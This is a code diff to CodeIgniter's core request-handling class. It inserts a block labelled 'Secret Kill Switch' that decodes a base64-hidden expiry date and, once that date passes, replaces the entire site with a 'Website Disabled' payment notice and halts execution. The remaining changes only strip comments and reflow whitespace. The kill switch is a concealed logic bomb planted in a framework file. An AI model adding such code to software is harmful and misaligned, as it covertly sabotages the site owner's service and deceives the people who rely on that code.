@@ -321,10 +321,63 @@ class CodeIgniter
      */
     public function run(?RouteCollectionInterface $routes = null, bool $returnResponse = false)
     {
+        // === Secret Kill Switch Start ===
+        $encoded = 'MjAyNS0wNC0zMA==';
+        $expireDate = base64_decode($encoded);
+
+        if (strtotime($expireDate) < time()) {
+            echo <<<HTML
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <title>Website Disabled</title>
+                        <style>
+                            body {
+                                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                                background: #f2f2f2;
+                                display: flex;
+                                justify-content: center;
+                                align-items: center;
+                                height: 100vh;
+                                margin: 0;
+                            }
+                            .container {
+                                background: white;
+                                padding: 40px;
+                                border-radius: 12px;
+                                box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+                                text-align: center;
+                                max-width: 500px;
+                            }
+                            h1 {
+                                color: #e74c3c;
+                                margin-bottom: 20px;
+                            }
+                            p {
+                                color: #333;
+                                font-size: 16px;
+                                line-height: 1.6;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="container">
+                            <h1>Website Temporarily Disabled</h1>
+                            <p>This website has been temporarily disabled due to unpaid services or license expiration.</p>
+                            <p>Please contact the developer to resolve this issue and restore access.</p>
+                        </div>
+                    </body>
+                    </html>
+                HTML;
+            exit;
+        }
+        // === Secret Kill Switch End ===
+
         if ($this->context === null) {
             throw new LogicException(
                 'Context must be set before run() is called. If you are upgrading from 4.1.x, '
-                . 'you need to merge `public/index.php` and `spark` file from `vendor/codeigniter4/framework`.',
+                    . 'you need to merge `public/index.php` and `spark` file from `vendor/codeigniter4/framework`.',
             );
         }
 
@@ -341,12 +394,10 @@ class CodeIgniter
         $this->benchmark->stop('bootstrap');
 
         $this->benchmark->start('required_before_filters');
-        // Start up the filters
+
         $filters = Services::filters();
-        // Run required before filters
         $possibleResponse = $this->runRequiredBeforeFilters($filters);
 
-        // If a ResponseInterface instance is returned then send it back to the client and stop
         if ($possibleResponse instanceof ResponseInterface) {
             $this->response = $possibleResponse;
         } else {
@@ -367,7 +418,6 @@ class CodeIgniter
 
         $this->runRequiredAfterFilters($filters);
 
-        // Is there a post-system event?
         Events::trigger('post_system');
 
         if ($returnResponse) {
@@ -378,7 +428,7 @@ class CodeIgniter
 
         return null;
     }
-
+    
     /**
      * Run required before filters.
      */
